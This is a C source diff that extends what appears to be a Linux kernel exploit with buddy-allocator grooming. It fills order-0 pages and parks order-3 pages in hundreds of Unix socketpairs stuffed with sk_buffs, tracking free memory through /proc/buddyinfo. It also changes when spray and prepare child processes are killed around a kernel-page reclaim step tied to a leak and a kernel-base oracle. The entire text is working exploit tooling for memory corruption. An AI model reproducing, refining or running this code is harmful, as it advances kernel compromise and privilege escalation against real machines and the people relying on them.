@@ -659,6 +659,106 @@ void close_reclaim_sockets(void) {
   }
 }
 
+#if defined(APP_BUDDY_PROTECT) && APP_BUDDY_PROTECT
+static void prefill_order0_buddy(void) {
+  size_t len = 16 << 20;
+  unsigned char *p = mmap(NULL, len, PROT_READ | PROT_WRITE,
+                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (p == MAP_FAILED)
+    return;
+  for (size_t off = 0; off < len; off += PAGE_SIZE)
+    p[off] = 0;
+  munmap(p, len);
+}
+
+#define ORDER3_HOLD_PAIRS_MAX 768
+static int order3_hold_sv[ORDER3_HOLD_PAIRS_MAX][2];
+static int order3_hold_pairs;
+static int order3_hold_inited;
+
+static long buddyinfo_order3_free(void) {
+  FILE *fp = fopen("/proc/buddyinfo", "r");
+  if (!fp)
+    return -1;
+  char line[512];
+  long fallback = -1, normal = -1;
+  while (fgets(line, sizeof(line), fp)) {
+    char *p = strstr(line, "zone");
+    if (!p)
+      continue;
+    char name[32];
+    unsigned long c0, c1, c2, c3;
+    if (sscanf(p + 4, "%31s %lu %lu %lu %lu", name, &c0, &c1, &c2, &c3) != 5)
+      continue;
+    if ((long)c3 > fallback)
+      fallback = (long)c3;
+    if (!strcmp(name, "Normal"))
+      normal = (long)c3;
+  }
+  fclose(fp);
+  return normal >= 0 ? normal : fallback;
+}
+
+static void order3_hold_begin(const struct msghdr *msg) {
+  long target = 0;
+  long max_pages = 4096;
+  long free3 = buddyinfo_order3_free();
+  long before = free3;
+  long pages = 0;
+  int skbs = 0;
+
+  if (!order3_hold_inited) {
+    for (int p = 0; p < ORDER3_HOLD_PAIRS_MAX; p++) {
+      order3_hold_sv[p][0] = -1;
+      order3_hold_sv[p][1] = -1;
+    }
+    order3_hold_inited = 1;
+  }
+
+  while (order3_hold_pairs < ORDER3_HOLD_PAIRS_MAX && pages < max_pages) {
+    if (free3 >= 0 && free3 <= target)
+      break;
+    int p = order3_hold_pairs;
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, order3_hold_sv[p]) != 0)
+      break;
+    order3_hold_pairs++;
+    int sent = 0;
+    for (int i = 0; i < 3; i++) {
+      if (sendmsg(order3_hold_sv[p][0], msg, MSG_DONTWAIT) <= 0)
+        break;
+      sent++;
+    }
+    if (!sent) {
+      close(order3_hold_sv[p][0]);
+      close(order3_hold_sv[p][1]);
+      order3_hold_sv[p][0] = -1;
+      order3_hold_sv[p][1] = -1;
+      order3_hold_pairs--;
+      break;
+    }
+    skbs += sent;
+    pages += (long)sent * 2;
+    free3 = buddyinfo_order3_free();
+  }
+  pr_info("mm order3 absorb: pairs=%d skbs=%d free3 %ld -> %ld (target=%ld)\n",
+          order3_hold_pairs, skbs, before, free3, target);
+}
+
+static void order3_hold_end(void) {
+  if (!order3_hold_inited)
+    return;
+  for (int p = 0; p < order3_hold_pairs; p++) {
+    for (int i = 0; i < 2; i++) {
+      if (order3_hold_sv[p][i] >= 0) {
+        close(order3_hold_sv[p][i]);
+        order3_hold_sv[p][i] = -1;
+      }
+    }
+  }
+  order3_hold_pairs = 0;
+}
+#endif
+
 int reclaim_receiver_fd(void) {
   return reclaim_sv[1];
 }
@@ -681,6 +781,9 @@ void free_ctx_storage(struct mm_ctx *ctx) {
 }
 
 void cleanup_page_prepare_state(void) {
+#if defined(APP_BUDDY_PROTECT) && APP_BUDDY_PROTECT
+  order3_hold_end();
+#endif
   close_ctx_memfds(&prepare_ctx);
   close_ctx_memfds(&spray_ctx);
   close_ctx_memfds(&pre_ctx);
@@ -1100,6 +1203,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(spray_ctx.childs[i]);
   }
   SYSCHK(waitpid(child_leak, NULL, 0));
+#if defined(APP_EARLY_KILL_PREPARE_CHILDREN) && APP_EARLY_KILL_PREPARE_CHILDREN
+  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    kill_child(prepare_ctx.childs[i]);
+    prepare_ctx.childs[i] = -1;
+  }
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   log_mm_slabinfo("after-child-exit");
 #endif
@@ -1316,6 +1425,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
+#if defined(APP_BUDDY_PROTECT) && APP_BUDDY_PROTECT
+  prefill_order0_buddy();
+  order3_hold_begin(&msg);
+#endif
   size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_MM_LATE_DRAIN_TRIGGERS
@@ -1405,6 +1518,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #else
   pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
           reclaim_sent, reclaim_sends, payload_mode);
+#endif
+#if defined(APP_BUDDY_PROTECT) && APP_BUDDY_PROTECT
+  order3_hold_end();
 #endif
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
